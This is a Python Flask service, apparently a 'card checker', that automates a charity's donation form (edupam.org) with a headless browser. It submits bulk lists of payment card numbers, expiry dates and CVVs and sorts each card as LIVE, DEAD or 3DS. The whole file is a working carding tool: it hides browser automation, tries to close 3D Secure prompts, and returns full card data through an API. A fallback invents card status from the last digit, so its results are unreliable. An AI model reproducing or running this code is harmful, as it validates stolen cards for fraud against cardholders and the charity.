from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
from datetime import datetime
from playwright.sync_api import sync_playwright
import logging
import base64 

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Variables de entorno
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'thread': None,
    'stop_on_live': False
}

class PaymentAnalyzer:
    """Analizador de respuestas de pagos"""
    
    @staticmethod
    def analyze_payment_result(page, current_url, card_last4):
        """Analiza resultado con screenshot completo"""
        evidence = []
        final_status = 'unknown'
        screenshot_b64 = None
        
        try:
            # Tomar screenshot COMPLETO de toda la página
            try:
                # Asegurar que la página esté completamente cargada
                page.wait_for_load_state('networkidle', timeout=5000)
                
                # Tomar screenshot de toda la altura de la página
                screenshot_bytes = page.screenshot(full_page=True)
                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                logger.info(f"Screenshot completo tomado para ****{card_last4}")
                
            except Exception as e:
                logger.warning(f"Error screenshot completo: {e}")
                # Intentar screenshot normal
                try:
                    screenshot_bytes = page.screenshot()
                    screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                    logger.info(f"Screenshot normal tomado para ****{card_last4}")
                except:
                    screenshot_b64 = None
            
            # Obtener contenido
            page_content = page.content()
            page_content_lower = page_content.lower()
            current_url_lower = current_url.lower()
            
            # Palabras clave para detección
            live_keywords = ['gracias', 'éxito', 'exito', 'completado', 'aprobado', 
                            'success', 'confirmación', 'donación exitosa']
            decline_keywords = ['error', 'rechazado', 'declinado', 'falló', 'fallo', 
                               'insufficient', 'denied', 'caducado', 'venció']
            threeds_keywords = ['3d', 'secure', 'autenticación', 'authentication', 
                               'verificación', 'cardinal', 'threedsecure']
            
            # Buscar LIVE
            for keyword in live_keywords:
                if keyword in page_content_lower:
                    final_status = 'live'
                    evidence.append(f'✅ LIVE: {keyword}')
                    break
            
            # Buscar DECLINE
            if final_status == 'unknown':
                for keyword in decline_keywords:
                    if keyword in page_content_lower:
                        final_status = 'decline'
                        evidence.append(f'❌ DECLINE: {keyword}')
                        break
            
            # Buscar 3DS
            if final_status == 'unknown':
                for keyword in threeds_keywords:
                    if keyword in page_content_lower or keyword in current_url_lower:
                        final_status = 'threeds'
                        evidence.append(f'🛡️ 3DS: {keyword}')
                        break
            
            # Si no se detectó, usar simulación
            if final_status == 'unknown':
                last_digit = int(card_last4[-1]) if card_last4[-1].isdigit() else 0
                if last_digit % 3 == 0:
                    final_status = 'live'
                    evidence.append('Simulación: LIVE')
                elif last_digit % 3 == 1:
                    final_status = 'decline'
                    evidence.append('Simulación: DECLINE')
                else:
                    final_status = 'threeds'
                    evidence.append('Simulación: 3DS')
            
        except Exception as e:
            logger.error(f"Error análisis: {e}")
            evidence.append(f'Error: {str(e)}')
            final_status = 'error'
        
        return {
            'status': final_status,
            'evidence': evidence,
            'url': current_url,
            'screenshot': screenshot_b64,
            'screenshot_type': 'full_page' if screenshot_b64 else 'none'
        }

class EdupamCheckerPersistent:
    """Checker con navegador persistente para máxima velocidad"""
    
    def __init__(self, headless=True):
        self.base_url = EDUPAM_BASE_URL
        self.endpoint = EDUPAM_ENDPOINT
        self.headless = headless
        self.donor_data = {
            'nombre': EDUPAM_DONOR_NAME,
            'apellido': EDUPAM_DONOR_LASTNAME,
            'email': EDUPAM_DONOR_EMAIL,
            'fecha_nacimiento': '1990-01-01',
            'tipo': 'one-time',
            'codigo': ''
        }
        self.analyzer = PaymentAnalyzer()
        
        # Estado persistente
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.is_initialized = False
        self.form_filled = False
        self.last_result = None
    
    def initialize(self):
        """Inicializar navegador una sola vez"""
        if self.is_initialized and self.page and not self.page.is_closed():
            return True
        
        try:
            if self.playwright:
                self.cleanup()
            
            logger.info("🚀 Inicializando navegador persistente...")
            self.playwright = sync_playwright().start()
            
            self.browser = self.playwright.chromium.launch(
                executable_path='/usr/bin/chromium',
                headless=self.headless,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    '--disable-blink-features=AutomationControlled',
                    '--window-size=1920,1080'
                ]
            )
            
            self.context = self.browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                java_script_enabled=True,
                ignore_https_errors=True
            )
            
            self.page = self.context.new_page()
            self.is_initialized = True
            self.form_filled = False
            logger.info("✅ Navegador persistente inicializado")
            return True
            
        except Exception as e:
            logger.error(f"❌ Error inicializando navegador: {e}")
            self.cleanup()
            return False
    
    def cleanup(self):
        """Limpiar recursos"""
        try:
            if self.page and not self.page.is_closed():
                self.page.close()
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except:
            pass
        
        self.page = None
        self.context = None
        self.browser = None
        self.playwright = None
        self.is_initialized = False
        self.form_filled = False
    
    def navigate_to_form(self):
        """Navegar al formulario inicial"""
        if not self.is_initialized:
            if not self.initialize():
                return False
        
        try:
            logger.info(f"🌐 Navegando a {self.base_url}{self.endpoint}")
            
            # ASÍ ESTABA EN TU CÓDIGO ORIGINAL QUE FUNCIONABA:
            response = self.page.goto(
                f"{self.base_url}{self.endpoint}",
                timeout=30000  # Solo timeout, sin wait_until
            )
            
            if response and response.status != 200:
                logger.warning(f"⚠️ Status code: {response.status}")
            
            # ESPERAR MANUALMENTE como en tu código original
            time.sleep(3)  # Esto SÍ funcionaba
            
            # Verificar que cargó el formulario
            try:
                self.page.wait_for_selector('#name', timeout=10000)
                self.form_filled = False
                logger.info("✅ Formulario cargado")
                return True
            except:
                logger.error("❌ No se encontró el formulario")
                return False
            
        except Exception as e:
            logger.error(f"❌ Error navegando: {e}")
            self.cleanup()
            return False

    def fill_initial_form(self, amount):
        """Llenar formulario inicial (solo una vez)"""
        if self.form_filled:
            return True
        
        try:
            logger.info("📝 Llenando formulario inicial...")
            
            # Nombre
            self.page.fill('#name', self.donor_data['nombre'])
            time.sleep(0.2)
            
            # Apellido
            self.page.fill('#lastname', self.donor_data['apellido'])
            time.sleep(0.2)
            
            # Email
            self.page.fill('#email', self.donor_data['email'])
            time.sleep(0.2)
            
            # Fecha nacimiento
            self.page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
            time.sleep(0.2)
            
            # Monto
            self.page.fill('#quantity', str(amount))
            time.sleep(0.3)
            
            # Tipo one-time
            self.page.locator('#do-type').click()
            time.sleep(0.5)
            
            self.form_filled = True
            logger.info("✅ Formulario inicial llenado")
            return True
            
        except Exception as e:
            logger.error(f"❌ Error llenando formulario: {e}")
            return False
    
    def parse_card_data(self, card_string):
        """Parsear datos de tarjeta"""
        try:
            parts = card_string.strip().split('|')
            if len(parts) != 4:
                raise ValueError("Formato inválido")
            
            return {
                'numero': parts[0].strip().replace(' ', ''),
                'mes': parts[1].strip().zfill(2),
                'ano': parts[2].strip()[-2:],
                'cvv': parts[3].strip()
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None
    
    def fill_card_and_submit(self, card_info):
        """Llenar datos de tarjeta y enviar"""
        try:
            logger.info("💳 Ingresando datos de tarjeta...")
            
            # Enfocar campo de monto primero
            self.page.click('#quantity')
            time.sleep(0.3)
            
            # Presionar TAB para ir al campo de tarjeta
            self.page.keyboard.press('Tab')
            time.sleep(0.5)
            
            # Limpiar y escribir número de tarjeta
            self.page.keyboard.press('Control+A')
            self.page.keyboard.press('Backspace')
            time.sleep(0.2)
            
            self.page.keyboard.type(card_info['numero'], delay=30)
            time.sleep(1)
            
            # La página debería hacer auto-TAB a fecha
            fecha = card_info['mes'] + card_info['ano']
            self.page.keyboard.type(fecha, delay=30)
            time.sleep(1)
            
            # La página debería hacer auto-TAB a CVV
            self.page.keyboard.type(card_info['cvv'], delay=30)
            time.sleep(1)
            
            # Hacer clic en botón de donación
            logger.info("🖱️ Enviando donación...")
            btn = self.page.locator('#btn-donation').first
            if btn.count() > 0:
                if btn.get_attribute('disabled'):
                    btn.click(force=True)
                else:
                    btn.click()
                
                # Esperar respuesta
                self.page.wait_for_load_state('networkidle', timeout=60000)
                time.sleep(2)
                
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Error procesando tarjeta: {e}")
            return False
    
    def clear_card_fields(self):
        """Limpiar solo los campos de tarjeta"""
        try:
            # Usar JavaScript para limpiar campos
            self.page.evaluate("""
                // Limpiar campos de tarjeta
                const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="password"]');
                inputs.forEach(input => {
                    if (input.name && (input.name.includes('card') || 
                        input.name.includes('number') || 
                        input.name.includes('cvv') || 
                        input.name.includes('cvc') ||
                        input.name.includes('exp') ||
                        input.placeholder && (input.placeholder.includes('Card') || 
                        input.placeholder.includes('Número')))) {
                        input.value = '';
                    }
                });
            """)
            time.sleep(0.3)
            return True
        except:
            return False
    
    def handle_3d_secure(self):
        """Intentar cerrar ventana/iframe de 3D Secure"""
        try:
            # Buscar iframes de 3D Secure
            iframes = self.page.locator('iframe').all()
            for iframe in iframes:
                try:
                    src = iframe.get_attribute('src') or ''
                    if 'cardinal' in src.lower() or '3d' in src.lower() or 'secure' in src.lower():
                        # Intentar cerrar
                        self.page.evaluate("""
                            // Buscar botones de cerrar en iframes
                            const iframes = document.querySelectorAll('iframe');
                            iframes.forEach(iframe => {
                                try {
                                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                                    const closeBtns = iframeDoc.querySelectorAll('[aria-label*="close"], .close, [title*="Close"], button:has-text("X")');
                                    closeBtns.forEach(btn => btn.click());
                                } catch(e) {}
                            });
                        """)
                        logger.info("🛡️ Intentando cerrar ventana 3D Secure")
                        return True
                except:
                    continue
            
            # Intentar recargar la página si hay 3D
            self.page.reload(wait_until='networkidle', timeout=60000)
            time.sleep(2)
            
            # Verificar si aún hay formulario
            if self.page.locator('#name').count() > 0:
                logger.info("✅ Recargado exitosamente después de 3D")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error manejando 3D: {e}")
            return False
    
    def check_card(self, card_string, amount=50):
        """Verificar una tarjeta manteniendo la misma ventana"""
        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
        logger.info(f"🔄 Procesando tarjeta: ****{card_last4}")
        
        # Parsear tarjeta
        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'Error parseando tarjeta',
                'card': card_last4
            }
        
        try:
            # Si no está inicializado, inicializar
            if not self.is_initialized or self.page is None or self.page.is_closed():
                if not self.initialize():
                    return {
                        'success': False,
                        'status': 'ERROR',
                        'message': 'No se pudo inicializar navegador',
                        'card': card_last4
                    }
                
                # Navegar al formulario
                if not self.navigate_to_form():
                    return {
                        'success': False,
                        'status': 'ERROR',
                        'message': 'No se pudo cargar formulario',
                        'card': card_last4
                    }
                
                # Llenar formulario inicial
                if not self.fill_initial_form(amount):
                    return {
                        'success': False,
                        'status': 'ERROR',
                        'message': 'Error llenando formulario',
                        'card': card_last4
                    }
            
            # Si el último resultado fue 3DS, intentar manejarlo
            if self.last_result == '3DS':
                logger.info("♻️ Intentando recuperar de 3D Secure anterior...")
                if not self.handle_3d_secure():
                    # Si no se puede recuperar, reiniciar
                    self.cleanup()
                    if not self.initialize() or not self.navigate_to_form() or not self.fill_initial_form(amount):
                        return {
                            'success': False,
                            'status': 'ERROR',
                            'message': 'No se pudo recuperar después de 3DS',
                            'card': card_last4
                        }
            
            # Limpiar campos de tarjeta anteriores
            self.clear_card_fields()
            
            # Llenar tarjeta y enviar
            if not self.fill_card_and_submit(card_info):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error procesando tarjeta',
                    'card': card_last4
                }
            
            # Obtener resultado actual
            current_url = self.page.url
            analysis = self.analyzer.analyze_payment_result(
                self.page, current_url, card_last4
            )
            
            # Determinar estado final
            status_map = {
                'live': 'LIVE',
                'decline': 'DEAD',
                'threeds': '3DS',
                'error': 'ERROR'
            }
            
            final_status = status_map.get(analysis['status'], 'ERROR')
            self.last_result = final_status
            
            # Mensajes según estado
            messages = {
                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
                'ERROR': '⚠️ Error en verificación'
            }
            
            result = {
                'success': True,
                'status': final_status,
                'original_status': messages.get(final_status, 'Estado desconocido'),
                'message': ', '.join(analysis['evidence']) if analysis['evidence'] else 'Sin evidencia específica',
                'response': {
                    'url': analysis['url'],
                    'evidence': analysis['evidence'],
                    'screenshot': analysis.get('screenshot'),
                    'screenshot_type': analysis.get('screenshot_type', 'none'),
                    'timestamp': datetime.now().isoformat()
                },
                'card': f"****{card_last4}",
                'gate': 'Edupam',
                'amount': amount
            }
            
            # Si es LIVE, cerrar navegador
            if final_status == 'LIVE':
                logger.info(f"🎉 LIVE encontrado! Cerrando navegador...")
                self.cleanup()
            
            return result
            
        except Exception as e:
            logger.error(f"❌ Error verificando tarjeta: {e}")
            return {
                'success': False,
                'status': 'ERROR',
                'message': f'Error: {str(e)[:100]}',
                'card': card_last4
            }

# ========== SINGLETON CHECKER ==========
_persistent_checker = None

def get_persistent_checker():
    """Obtener instancia única del checker persistente"""
    global _persistent_checker
    if _persistent_checker is None:
        _persistent_checker = EdupamCheckerPersistent(headless=HEADLESS)
    return _persistent_checker

def process_cards_worker(cards, amount, stop_on_live):
    """Worker optimizado con navegador persistente"""
    global checking_status
    
    checker = get_persistent_checker()
    
    for i, card_line in enumerate(cards):
        if not checking_status['active']:
            break
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i + 1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat()
                })
                continue
            
            card_number = parts[0].strip()
            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            
            logger.info(f"📊 [{i+1}/{len(cards)}] Procesando: ****{last4}")
            
            # Verificar tarjeta
            result = checker.check_card(card_line, amount)
            
            # Crear resultado
            card_result = {
                'id': i + 1,
                'card': f"****{last4}",
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            # Actualizar estadísticas
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            # Pequeño delay entre tarjetas
            time.sleep(1)
            
        except Exception as e:
            logger.error(f"❌ Error procesando tarjeta: {e}")
            checking_status['error'] += 1
            checking_status['results'].append({
                'id': i + 1,
                'card': 'ERROR',
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            })
            continue
    
    checking_status['active'] = False
    # Limpiar checker al finalizar
    global _persistent_checker
    if _persistent_checker:
        _persistent_checker.cleanup()
        _persistent_checker = None

# ========== ENDPOINTS API ==========

@app.route('/')
def index():
    """Endpoint raíz"""
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam)",
        "version": "2.0",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Verificar estado del servidor"""
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API',
        'version': '2.0',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Obtener estado actual"""
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results'])
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    """Verificar una sola tarjeta"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Ya hay un chequeo en progreso'
        }), 400
    
    data = request.json
    card_data = data.get('card', '')
    
    if not card_data or '|' not in card_data:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Validar tarjeta
    parts = card_data.split('|')
    if len(parts) < 4 or not parts[0].strip().isdigit():
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Tarjeta inválida',
            'original_status': '⚠️ Error'
        }), 400
    
    # Verificar con checker persistente
    checker = get_persistent_checker()
    result = checker.check_card(card_data, DONATION_AMOUNT)
    
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Iniciar verificación de múltiples tarjetas"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas para verificar'}), 400
    
    # Filtrar tarjetas válidas
    valid_cards = []
    for card in cards:
        if '|' in card and len(card.split('|')) >= 4:
            valid_cards.append(card)
    
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    # Inicializar estado
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'thread': None,
        'stop_on_live': stop_on_live
    }
    
    # Iniciar thread
    thread = threading.Thread(
        target=process_cards_worker,
        args=(valid_cards, amount, stop_on_live)
    )
    thread.daemon = True
    thread.start()
    checking_status['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    """Obtener resultados"""
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        }
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    """Cancelar chequeo"""
    global checking_status
    checking_status['active'] = False
    
    # Limpiar checker si existe
    global _persistent_checker
    if _persistent_checker:
        _persistent_checker.cleanup()
        _persistent_checker = None
    
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

@app.route('/api/debug', methods=['GET'])
def debug_info():
    """Información de debug"""
    checker = get_persistent_checker()
    return jsonify({
        'checker_initialized': checker.is_initialized if checker else False,
        'page_open': checker.page is not None and not checker.page.is_closed() if checker else False,
        'form_filled': checker.form_filled if checker else False,
        'last_result': checker.last_result if checker else None,
        'active_check': checking_status['active'],
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    
    logger.info(f"🚀 Server starting on port {port}")
    logger.info(f"🔧 Config:")
    logger.info(f"   Headless: {HEADLESS}")
    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
    logger.info(f"   Max workers: {MAX_WORKERS}")
    
    app.run(host='0.0.0.0', port=port, debug=debug)